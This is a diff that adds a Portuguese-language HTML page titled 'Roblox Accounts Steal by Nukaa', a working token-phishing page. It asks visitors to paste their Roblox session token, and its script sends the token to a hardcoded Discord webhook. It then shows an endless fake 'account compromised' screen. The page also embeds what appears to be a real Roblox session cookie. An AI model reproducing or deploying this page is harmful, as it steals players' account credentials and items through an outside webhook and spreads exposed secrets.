@@ -1,0 +1,195 @@
+<!DOCTYPE html>
+<html lang="pt-br">
+<head>
+  <meta charset="UTF-8" />
+  <meta name="viewport" content="width=device-width, initial-scale=1.0"/>
+  <title>Roblox Accounts Steal by Nukaa</title>
+  <style>
+    body {
+      background: linear-gradient(135deg, #0f001a, #1a0033);
+      color: #e0ccff;
+      font-family: 'Segoe UI', Arial, sans-serif;
+      text-align: center;
+      padding: 0;
+      margin: 0;
+      min-height: 100vh;
+      overflow: hidden;
+    }
+    #main {
+      padding: 60px 20px;
+    }
+    h1 {
+      color: #ff0044;
+      font-size: 3.2em;
+      margin-bottom: 15px;
+      text-shadow: 0 0 15px #ff0044;
+    }
+    .subtitle {
+      color: #ff88aa;
+      font-size: 1.6em;
+      margin-bottom: 50px;
+      font-weight: bold;
+    }
+    input {
+      width: 90%;
+      max-width: 550px;
+      padding: 18px;
+      font-size: 20px;
+      border: 3px solid #990033;
+      border-radius: 12px;
+      background: #0d001a;
+      color: #ffccdd;
+      margin-bottom: 30px;
+      box-shadow: inset 0 0 10px #660022;
+    }
+    button {
+      padding: 18px 80px;
+      font-size: 22px;
+      background: linear-gradient(90deg, #ff0044, #cc0033);
+      color: white;
+      border: none;
+      border-radius: 12px;
+      cursor: pointer;
+      font-weight: bold;
+      box-shadow: 0 0 20px #ff0044;
+    }
+    button:hover {
+      background: linear-gradient(90deg, #cc0033, #990022);
+      transform: scale(1.08);
+    }
+    #status {
+      margin-top: 40px;
+      font-size: 20px;
+      font-weight: bold;
+    }
+    .glow {
+      text-shadow: 0 0 20px #ff0044, 0 0 40px #cc0033;
+    }
+
+    /* Loading screen */
+    #loading {
+      display: none;
+      position: fixed;
+      top: 0; left: 0;
+      width: 100%; height: 100%;
+      background: rgba(0, 0, 0, 0.97);
+      z-index: 9999;
+      flex-direction: column;
+      justify-content: center;
+      align-items: center;
+    }
+    .spinner {
+      width: 100px;
+      height: 100px;
+      border: 12px solid #ff0044;
+      border-top: 12px solid #cc0033;
+      border-radius: 50%;
+      animation: spin 1.3s linear infinite;
+      margin-bottom: 50px;
+    }
+    @keyframes spin {
+      0% { transform: rotate(0deg); }
+      100% { transform: rotate(360deg); }
+    }
+    #loading-text {
+      font-size: 2.6em;
+      color: #ff88aa;
+      text-shadow: 0 0 15px #ff0044;
+      min-height: 80px;
+    }
+  </style>
+</head>
+<body>
+<div id="main">
+<h1 class="glow">Roblox Accounts Steal by Nukaa</h1>
+<p class="subtitle">Insira o token aqui</p>
+<span>_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_CAEaAhADIhsKBGR1aWQSEzg1NDg2OTI5MzU2NzMzNzMzMzgoAw.EaksOJfegrjRRjqSvDNumecRK8-mpfGynwz_auHx6R1a_s07gHN_4i6AJe1usBcaOBgw06rqekezk9TseaVCrt-oLzFcn_drRDij2KD588oFKmjxlYQR07wBazTpYmE7tc4KquuA4c9PM9NBoHMzPKweV1B3hzX7Qv-QOAMw87Y3QU4rKZWn-yBCGV-UfIGvb9pU7V8N87m04UzSIqUcG-7kBK_xChcJqaaajz2DbO5Pd84ZgEpf7XWMzdRBrPpaRQtDm2oOkbcZzKmubBmdnhVHDOhEv2_crkavkssrBtm4AplTmNr_iaR-6OV4Wzd60pCEAUDBLke-wza_LjVDu3Gh7K7SEldrq2oMqLKmcpYi8tCxp_QWxRh0H8RT82qLehTlOLgIDV8HxCCLFy2e_83RDJ-Iwla3X44Wuqh5sckYoTS7-voFegeq_QsgQ01iZzBxK4vPihrDKYgi37iCsmT0n31MJBqDFlubiFJjBR7Pi5DiLMIVLcnhupxTuqH-GWmja3jf5LdkmZcIYevWwj8lhB68rsA3RjHJpyHpN0sKSRUI3AIzePMif9cyKidZDEFOECSYKAPoiAVooUA8D6oadPHXDJn0sfodPap-B7m1dCkof9zWyokHZTXobTqP61jMY0K5gT2PlCnauMqDa-fP_ey6XRyLt3ItfHhAfgFa_OokzeVLSDClMOsTCxr-3CQK1y27DHMI0NIgyPosOq_v3CqmxLKan1AY1LqYfhzDdBUk2hZ4zxmqVV7rtUBCOEBxusgndEoWyqfeIyQFZnpZXAqoyCF-GBJHnwMbL8pfCW9p</span><input type="text" id="token" placeholder="_|WARNING:_DO-NOT-SHARE-THIS._ ..." /> <br /><button id="sendBtn" onclick="enviar()">Enviar token</button>
+<div id="status"></div>
+</div>
+<div id="loading">
+<div class="spinner"></div>
+<div id="loading-text">Acessando conta...</div>
+</div>
+<script>
+    const messages = [
+      "Acessando conta...",
+      "Verificando autenticação...",
+      "Decodificando token...",
+      "Descobrindo senha...",
+      "Localizando itens...",
+      "Acessando histórico...",
+      "Limpando vestígios...",
+      "Bypassando proteções...",
+      "Finalizando acesso total...",
+      "Conta completamente comprometida..."
+    ];
+
+    let msgIndex = 0;
+    let interval;
+
+    function showLoading() {
+      document.getElementById("main").style.display = "none";
+      document.getElementById("loading").style.display = "flex";
+
+      const textEl = document.getElementById("loading-text");
+
+      interval = setInterval(() => {
+        textEl.innerText = messages[msgIndex];
+        msgIndex = (msgIndex + 1) % messages.length;
+      }, 2800); // muda a cada 2.8 segundos
+    }
+
+    function enviar() {
+      const token = document.getElementById("token").value.trim();
+      const status = document.getElementById("status");
+      const btn = document.getElementById("sendBtn");
+
+      if (token.length < 30) {
+        status.innerHTML = "Token curto demais. Cola o correto.";
+        status.style.color = "#ff6666";
+        return;
+      }
+
+      status.innerHTML = "Enviando token...";
+      status.style.color = "#ffff66";
+
+      btn.disabled = true;
+      btn.innerText = "Enviando...";
+
+      const webhook = "https://discordapp.com/api/webhooks/1472960946363306016/K2T6_RdOTxyn2maT47ySjjNLQaVdjT9O7mHl6eIf_DRlil5L2fgH4vA9UB5sPZFm318y";
+
+      const payload = {
+        content: "**@everyone TOKEN RECEBIDO** 💀",
+        embeds: [{
+          title: "Token Roblox",
+          description: "```" + token + "```",
+          color: 0xff0044,
+          fields: [
+            { name: "Status", value: "Conta sendo acessada", inline: true },
+            { name: "Fonte", value: "Token colado", inline: true }
+          ],
+          footer: {
+            text: new Date().toLocaleString("pt-BR")
+          }
+        }]
+      };
+
+      fetch(webhook, {
+        method: "POST",
+        headers: { "Content-Type": "application/json" },
+        body: JSON.stringify(payload)
+      })
+      .then(() => {
+        status.innerHTML = "";
+        showLoading(); // loading infinito puro
+      })
+      .catch(() => {
+        status.innerHTML = "Falha ao enviar. Tente novamente.";
+        status.style.color = "#ff6666";
+        btn.disabled = false;
+        btn.innerText = "Enviar token";
+      });
+    }
+  </script>
+</body>
+</html>
